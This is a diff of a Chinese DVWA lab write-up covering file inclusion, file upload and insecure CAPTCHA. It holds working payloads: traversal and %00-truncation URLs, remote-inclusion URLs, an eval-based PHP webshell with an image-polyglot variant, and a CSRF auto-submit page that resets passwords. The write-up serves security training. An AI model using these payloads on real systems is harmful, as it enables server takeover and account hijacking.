+		$html .= "<pre>Passwords did not match.</pre>";
+	}
 
-    mysql_close();
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
 }
 
 // Generate Anti-CSRF token
@@ -849,45 +866,45 @@ generateSessionToken();
 <?php
 
 if( isset( $_GET[ 'Change' ] ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+	// Check Anti-CSRF token
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 
-    // Get input
-    $pass_curr = $_GET[ 'password_current' ];
-    $pass_new  = $_GET[ 'password_new' ];
-    $pass_conf = $_GET[ 'password_conf' ];
+	// Get input
+	$pass_curr = $_GET[ 'password_current' ];
+	$pass_new  = $_GET[ 'password_new' ];
+	$pass_conf = $_GET[ 'password_conf' ];
 
-    // Sanitise current password input
-    $pass_curr = stripslashes( $pass_curr );
-    $pass_curr = mysql_real_escape_string( $pass_curr );
-    $pass_curr = md5( $pass_curr );
+	// Sanitise current password input
+	$pass_curr = stripslashes( $pass_curr );
+	$pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+	$pass_curr = md5( $pass_curr );
 
-    // Check that the current password is correct
-    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
-    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
-    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
-    $data->execute();
+	// Check that the current password is correct
+	$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+	$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+	$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
+	$data->execute();
 
-    // Do both new passwords match and does the current password match the user?
-    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
-        // It does!
-        $pass_new = stripslashes( $pass_new );
-        $pass_new = mysql_real_escape_string( $pass_new );
-        $pass_new = md5( $pass_new );
+	// Do both new passwords match and does the current password match the user?
+	if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
+		// It does!
+		$pass_new = stripslashes( $pass_new );
+		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+		$pass_new = md5( $pass_new );
 
-        // Update database with new password
-        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
-        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
-        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
-        $data->execute();
+		// Update database with new password
+		$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
+		$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
+		$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+		$data->execute();
 
-        // Feedback for the user
-        echo "<pre>Password Changed.</pre>";
-    }
-    else {
-        // Issue with passwords matching
-        echo "<pre>Passwords did not match or current password incorrect.</pre>";
-    }
+		// Feedback for the user
+		$html .= "<pre>Password Changed.</pre>";
+	}
+	else {
+		// Issue with passwords matching
+		$html .= "<pre>Passwords did not match or current password incorrect.</pre>";
+	}
 }
 
 // Generate Anti-CSRF token
@@ -908,10 +925,12 @@ phpstudy开一下这2个参数
 ### Low
 **服务器端核心代码**
 ```php
-<php
-//Thepagewewishtodisplay
-$file=$_GET['page'];
->
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+?>
 ```
 
 可以看到，服务器端对 page 参数没有做任何的过滤跟检查。
@@ -945,20 +964,1260 @@ $file=$_GET['page'];
 
     `http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini`
 
-    加这么多 ..\ 是为了保证到达服务器的C盘根目录，可以看到读取是成功的。
+    加这么多 ../ 是为了保证到达服务器的C盘根目录，可以看到读取是成功的。
 
     ![image](../../../img/渗透/实验/dvwa19.png)
 
     同时我们看到，配置文件中的 Magic_quote_gpc 选项为 off。在 php 版本小于 5.3.4 的服务器中，当 Magic_quote_gpc 选项为 off 时，我们可以在文件名中使用 %00 进行截断，也就是说文件名中 %00 后的内容不会被识别，即下面两个 url 是完全等效的。
 
-    1. http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=..\..\..\..\..\..\..\..\..\xampp\htdocs\dvwa\php.ini
+    1. http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini
 
-    2. http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=..\..\..\..\..\..\..\..\..\xampp\htdocs\dvwa\php.ini%0012.php
+    2. http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini%0012.php
+
+    使用 %00 截断可以绕过某些过滤规则，例如要求 page 参数的后缀必须为 php，这时链接 A 会读取失败，而链接 B 可以绕过规则成功读取。
+
+**远程文件包含**
+
+当服务器的 php 配置中，选项 allow_url_fopen 与 allow_url_include 为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。
+
+在远程服务器 B 上传一个 phpinfo.txt 文件，内容如下
+```php
+<?php
+
+phpinfo();
+
+?>
+```
+
+构造url `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=http://<服务器B IP地址!!!>/phpinfo.txt`
+
+成功在服务器上执行了 phpinfo 函数
+
+![image](../../../img/渗透/实验/dvwa20.png)
+
+为了增加隐蔽性，可以对 http://<服务器B IP地址!!!>/phpinfo.txt 进行 URL 编码
+
+例如
+
+`http://192.168.72.128/dvwa/vulnerabilities/fi/?page=http://192.168.72.138/phpinfo.txt`
+
+可以编码为
+
+`http://192.168.72.128/dvwa/vulnerabilities/fi/?page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%37%32%2e%31%33%38%2f%70%68%70%69%6e%66%6f%2e%74%78%74` 同样可以执行成功
+
+### Medium
+**服务器端核心代码**
+```php
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\"" ), "", $file );
+
+?>
+```
+
+可以看到，Medium 级别的代码增加了 str_replace 函数，对 page 参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。
+
+**漏洞利用**
+
+使用 str_replace 函数是极其不安全的，因为可以使用双写绕过替换规则。
+
+例如 `page=hthttp://tp://<IP地址!!!>/phpinfo.txt` 时，str_replace 函数会将 http:// 删除，于是 `page=http://<IP地址!!!>/phpinfo.txt`，成功执行远程命令。
+
+同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。
+
+**本地文件包含**
+
+`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././phpStudy/PHPTutorial/WWW/DVWA/php.ini` 读取配置文件成功
+
+![image](../../../img/渗透/实验/dvwa21.png)
+
+**远程文件包含**
+
+`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=hhttp://ttp://<服务器B IP地址!!!>/phpinfo.txt` 远程执行命令成功
+
+![image](../../../img/渗透/实验/dvwa22.png)
+
+经过编码后的 url 不能绕过替换规则，因为解码是在浏览器端完成的，发送过去的 page 参数依然是http://<IP地址!!!>/phpinfo.txt，因此读取失败。
+
+### High
+**服务器端核心代码**
+```php
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
+	// This isn't the page we want!
+	echo "ERROR: File not found!";
+	exit;
+}
+
+?>
+```
+可以看到，High 级别的代码使用了 fnmatch 函数检查 page 参数，要求 page 参数的开头必须是 file，服务器才会去包含相应的文件。
+
+**漏洞利用**
+High 级别的代码规定只能包含 file 开头的文件，看似安全，不幸的是我们依然可以利用 file 协议绕过防护策略。file 协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是 file 协议。
+
+构造 url `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=file://C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini`
+
+![image](../../../img/渗透/实验/dvwa23.png)
+
+至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为 php 的文件，然后再利用 file 协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。
+
+### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Only allow include.php or file{1..3}.php
+if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
+	// This isn't the page we want!
+	echo "ERROR: File not found!";
+	exit;
+}
+
+?>
+```
+
+可以看到，Impossible 级别的代码使用了白名单机制进行防护，简单粗暴，page 参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。
+
+---
+
+## File Upload
+File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的 webshell 权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx 等都曝出过文件上传漏洞。
+
+### Low
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+	// Where are we going to be writing to?
+	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
+	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
+
+	// Can we move the file to the upload folder?
+	if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
+		// No
+		$html .= '<pre>Your image was not uploaded.</pre>';
+	}
+	else {
+		// Yes!
+		$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
+	}
+}
+
+?>
+```
+
+- **basename(path,suffix)**
+
+    函数返回路径中的文件名部分，如果可选参数 suffix 为空，则返回的文件名包含后缀名，反之不包含后缀名。
+
+可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。
+
+**漏洞利用**
+
+文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。不幸的是，这里三个条件全都满足。
+
+上传文件 shell.php（一句话木马）
+```php
+<?php @eval($_POST['ant']); ?>
+```
+
+上传成功，并且返回了上传路径
+
+![image](../../../img/渗透/实验/dvwa24.png)
+
+注:这里推荐用开源的 [antSword](https://github.com/AntSwordProject/antSword) 连接webshell，安装步骤这里略
+
+`http://<IP地址!!!>/dvwa/hackable/uploads/shell.php`
+
+![image](../../../img/渗透/实验/dvwa25.png)
+
+然后 antSword 就会通过向服务器发送包含 ant 参数的 post 请求，在服务器上执行任意命令，获取 webshell 权限。可以下载、修改服务器的所有文件。
+
+![image](../../../img/渗透/实验/dvwa26.png)
+
+### Medium
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+	// Where are we going to be writing to?
+	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
+	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
+
+	// File information
+	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
+	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
+	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
+
+	// Is it an image?
+	if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
+		( $uploaded_size < 100000 ) ) {
+
+		// Can we move the file to the upload folder?
+		if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
+			// No
+			$html .= '<pre>Your image was not uploaded.</pre>';
+		}
+		else {
+			// Yes!
+			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
+		}
+	}
+	else {
+		// Invalid file
+		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
+	}
+}
+
+?>
+```
+
+可以看到，Medium 级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是 jpeg 或者 png，大小不能超过 100000B（约为 97.6KB）。
+
+**组合拳（文件包含+文件上传）**
+
+因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为 shell.png , 上传成功
+
+![image](../../../img/渗透/实验/dvwa27.png)
+
+尝试使用 antSword 连接,不幸的是，虽然成功上传了文件，但是并不能成功获取 webshell 权限，在 antSword 上会报错
+
+这是因为 antSword 的原理是向上传文件发送包含 ant 参数的 post 请求，通过控制 ant 参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送 post 请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。
+
+这里可以借助 Medium 级别的文件包含漏洞来获取 webshell 权限
+`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=hthttp://tp://<IP地址!!!>/dvwa/hackable/uploads/shell.png`
+
+`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/shell.php`
+
+注: 这里的 post 需要一个带 Medium 级别的 cookie 请求，antSword 现在貌似不支持带 cookie 访问，我是自己配置 burp 代理，用 burp 抓包加上 cookie 进行访问的
+
+![image](../../../img/渗透/实验/dvwa28.png)
+![image](../../../img/渗透/实验/dvwa29.png)
+
+**抓包修改文件类型**
+上传 shell.png 文件，抓包。
+
+![image](../../../img/渗透/实验/dvwa30.png)
+
+可以看到文件类型为 image/png，尝试修改 filename 为 shell.php。
+
+![image](../../../img/渗透/实验/dvwa31.png)
+
+上传成功。上 antSword 连接
+
+**截断绕过规则**
+
+在 php 版本小于 5.3.4 的服务器中，当 Magic_quote_gpc 选项为 off 时，可以在文件名中使用 %00 截断，所以可以把上传文件命名为 shell.php%00.png。
+
+![image](../../../img/渗透/实验/dvwa32.png)
+
+可以看到，包中的文件类型为 image/png，可以通过文件类型检查。上传成功。
+![image](../../../img/渗透/实验/dvwa33.png)
+
+而服务器会认为其文件名为 shell.php，顺势解析为 php 文件。
+
+### High
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+	// Where are we going to be writing to?
+	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
+	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
+
+	// File information
+	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
+	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
+	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
+	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];
+
+	// Is it an image?
+	if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
+		( $uploaded_size < 100000 ) &&
+		getimagesize( $uploaded_tmp ) ) {
+
+		// Can we move the file to the upload folder?
+		if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
+			// No
+			$html .= '<pre>Your image was not uploaded.</pre>';
+		}
+		else {
+			// Yes!
+			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
+		}
+	}
+	else {
+		// Invalid file
+		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
+	}
+}
+
+?>
+```
+- **strrpos(string,find,start)**
+
+    函数返回字符串 find 在另一字符串 string 中最后一次出现的位置，如果没有找到字符串则返回 false，可选参数 start 规定在何处开始搜索。
+
+- **getimagesize(string filename)**
+
+    函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。
+
+可以看到，High 级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是 ”*.jpg”、”*.jpeg” 、”*.png” 之一。同时，getimagesize 函数更是限制了上传文件的文件头必须为图像类型。
+
+漏洞利用
+采用 %00 截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片，这里只演示如何借助 High 级别的文件包含漏洞来完成攻击。
+
+首先利用 copy 将一句话木马文件 php.php 与图片文件 1.jpg 合并
+
+`copy 1.jpg/b+php.php/a shell.jpg`
+
+![image](../../../img/渗透/实验/dvwa34.png)
+
+打开可以看到，一句话木马藏到了最后。顺利通过文件头检查，可以成功上传。
+
+![image](../../../img/渗透/实验/dvwa35.png)
+
+注：我在 win10 裸机上进行的 phpstury 环境搭建，在这一步上传过程中，一直失败，后来发现是 windows defender 把上传上来的图片马杀掉了，所以出现同类问题可以检查下杀软情况
+
+
+antSword 连接：
+
+`http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/shell.jpg`
+
+这里和上面一样，自己抓包加上 cookie
+
+![image](../../../img/渗透/实验/dvwa36.png)
+
+### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+	// Check Anti-CSRF token
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+
+	// File information
+	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
+	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
+	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
+	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
+	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];
+
+	// Where are we going to be writing to?
+	$target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
+	//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
+	$target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
+	$temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
+	$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
+
+	// Is it an image?
+	if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
+		( $uploaded_size < 100000 ) &&
+		( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
+		getimagesize( $uploaded_tmp ) ) {
+
+		// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
+		if( $uploaded_type == 'image/jpeg' ) {
+			$img = imagecreatefromjpeg( $uploaded_tmp );
+			imagejpeg( $img, $temp_file, 100);
+		}
+		else {
+			$img = imagecreatefrompng( $uploaded_tmp );
+			imagepng( $img, $temp_file, 9);
+		}
+		imagedestroy( $img );
+
+		// Can we move the file to the web root from the temp folder?
+		if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
+			// Yes!
+			$html .= "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
+		}
+		else {
+			// No
+			$html .= '<pre>Your image was not uploaded.</pre>';
+		}
+
+		// Delete any temp files
+		if( file_exists( $temp_file ) )
+			unlink( $temp_file );
+	}
+	else {
+		// Invalid file
+		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
+	}
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?>
+```
+
+- **in_get(varname)**
+
+    函数返回相应选项的值
+
+- **imagecreatefromjpeg ( filename )**
+
+    函数返回图片文件的图像标识，失败返回false
+
+- **imagejpeg ( image , filename , quality)**
+
+    从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。
+
+- **imagedestroy( img )**
+
+    函数销毁图像资源
+
+可以看到，Impossible 级别的代码对上传文件进行了重命名（为 md5 值，导致 %00 截断无法绕过过滤规则），加入 Anti-CSRF token 防护 CSRF 攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。
+
+---
+
+## Insecure CAPTCHA
+Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA 是 Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。但个人觉得，这一模块的内容叫做不安全的验证流程更妥当些，因为这块主要是验证流程出现了逻辑漏洞，谷歌的验证码表示不背这个锅。
+
+这一步服务器可以不需要翻墙，主要在于绕过验证码
+去 https://www.google.com/recaptcha/admin/create 申请下 key，信息随便填
+
+在`dvwa\config\config.inc.php`中加入如下API key
+```
+$_DVWA[ 'recaptcha_public_key' ]  = '你的公钥';
+$_DVWA[ 'recaptcha_private_key' ] = '你的私钥';
+```
+
+**reCAPTCHA 验证流程**
+
+这一模块的验证码使用的是 Google 提供 reCAPTCHA 服务，下图是验证的具体流程。
+
+![image](../../../img/渗透/实验/dvwa37.png)
+
+服务器通过调用 recaptcha_check_answer 函数检查用户输入的正确性。
+
+recaptcha_check_answer($privkey,$remoteip, $challenge,$response)
+
+数 $privkey 是服务器申请的 private key ，$remoteip 是用户的 ip，$challenge 是recaptcha_challenge_field 字段的值，来自前端页面 ，$response是 recaptcha_response_field 字段的值。函数返回 ReCaptchaResponse class 的实例，ReCaptchaResponse 类有2个属性 ：
+1. $is_valid 是布尔型的，表示校验是否有效，
+2. $error 是返回的错误代码。
+
+### Low
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
+	// Hide the CAPTCHA form
+	$hide_form = true;
+
+	// Get input
+	$pass_new  = $_POST[ 'password_new' ];
+	$pass_conf = $_POST[ 'password_conf' ];
+
+	// Check CAPTCHA from 3rd party
+	$resp = recaptcha_check_answer(
+		$_DVWA[ 'recaptcha_private_key'],
+		$_POST['g-recaptcha-response']
+	);
+
+	// Did the CAPTCHA fail?
+	if( !$resp ) {
+		// What happens when the CAPTCHA was entered incorrectly
+		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
+		$hide_form = false;
+		return;
+	}
+	else {
+		// CAPTCHA was correct. Do both new passwords match?
+		if( $pass_new == $pass_conf ) {
+			// Show next stage for the user
+			$html .= "
+				<pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
+				<form action=\"#\" method=\"POST\">
+					<input type=\"hidden\" name=\"step\" value=\"2\" />
+					<input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
+					<input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
+					<input type=\"submit\" name=\"Change\" value=\"Change\" />
+				</form>";
+		}
+		else {
+			// Both new passwords do not match.
+			$html     .= "<pre>Both passwords must match.</pre>";
+			$hide_form = false;
+		}
+	}
+}
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
+	// Hide the CAPTCHA form
+	$hide_form = true;
+
+	// Get input
+	$pass_new  = $_POST[ 'password_new' ];
+	$pass_conf = $_POST[ 'password_conf' ];
+
+	// Check to see if both password match
+	if( $pass_new == $pass_conf ) {
+		// They do!
+		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+		$pass_new = md5( $pass_new );
+
+		// Update database
+		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+		// Feedback for the end user
+		$html .= "<pre>Password Changed.</pre>";
+	}
+	else {
+		// Issue with the passwords matching
+		$html .= "<pre>Passwords did not match.</pre>";
+		$hide_form = false;
+	}
+
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?>
+```
+
+可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交 post 请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查 Change、step 参数来判断用户是否已经输入了正确的验证码。
+
+
+**通过构造参数绕过验证过程的第一步**
+
+首先输入密码，点击 Change 按钮，抓包，更改 step 参数绕过验证码：
+
+![image](../../../img/渗透/实验/dvwa38.png)
+
+ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有 recaptcha_challenge_field、recaptcha_response_field 两个参数
+
+**CSRF**
+
+由于没有任何的防 CSRF 机制，我们可以轻易地构造攻击页面，页面代码如下
+```
+<html>
+
+<body onload="document.getElementById('transfer').submit()">
+
+  <div>
+
+    <form method="POST" id="transfer" action="http://<IP地址!!!>/dvwa/vulnerabilities/captcha/">
+
+		<input type="hidden" name="password_new" value="password">
+
+		<input type="hidden" name="password_conf" value="password">
+
+		<input type="hidden" name="step" value="2"
+
+		<input type="hidden" name="Change" value="Change">
+
+	</form>
+
+  </div>
+
+</body>
+
+</html>
+```
+
+当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。
+美中不足的是，受害者会看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回 302，实现自动跳转），从而意识到自己遭到了攻击
+
+### Medium
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
+	// Hide the CAPTCHA form
+	$hide_form = true;
+
+	// Get input
+	$pass_new  = $_POST[ 'password_new' ];
+	$pass_conf = $_POST[ 'password_conf' ];
+
+	// Check CAPTCHA from 3rd party
+	$resp = recaptcha_check_answer(
+		$_DVWA[ 'recaptcha_private_key' ],
+		$_POST['g-recaptcha-response']
+	);
+
+	// Did the CAPTCHA fail?
+	if( !$resp ) {
+		// What happens when the CAPTCHA was entered incorrectly
+		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
+		$hide_form = false;
+		return;
+	}
+	else {
+		// CAPTCHA was correct. Do both new passwords match?
+		if( $pass_new == $pass_conf ) {
+			// Show next stage for the user
+			$html .= "
+				<pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
+				<form action=\"#\" method=\"POST\">
+					<input type=\"hidden\" name=\"step\" value=\"2\" />
+					<input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
+					<input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
+					<input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
+					<input type=\"submit\" name=\"Change\" value=\"Change\" />
+				</form>";
+		}
+		else {
+			// Both new passwords do not match.
+			$html     .= "<pre>Both passwords must match.</pre>";
+			$hide_form = false;
+		}
+	}
+}
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
+	// Hide the CAPTCHA form
+	$hide_form = true;
+
+	// Get input
+	$pass_new  = $_POST[ 'password_new' ];
+	$pass_conf = $_POST[ 'password_conf' ];
+
+	// Check to see if they did stage 1
+	if( !$_POST[ 'passed_captcha' ] ) {
+		$html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
+		$hide_form = false;
+		return;
+	}
+
+	// Check to see if both password match
+	if( $pass_new == $pass_conf ) {
+		// They do!
+		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+		$pass_new = md5( $pass_new );
+
+		// Update database
+		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+		// Feedback for the end user
+		$html .= "<pre>Password Changed.</pre>";
+	}
+	else {
+		// Issue with the passwords matching
+		$html .= "<pre>Passwords did not match.</pre>";
+		$hide_form = false;
+	}
+
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?>
+```
+
+可以看到，Medium 级别的代码在第二步验证时，参加了对参数 passed_captcha 的检查，如果参数值为 true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与 Low 级别的验证没有任何区别。
+
+**可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码。**
+
+![image](../../../img/渗透/实验/dvwa39.png)
+
+**CSRF**
+
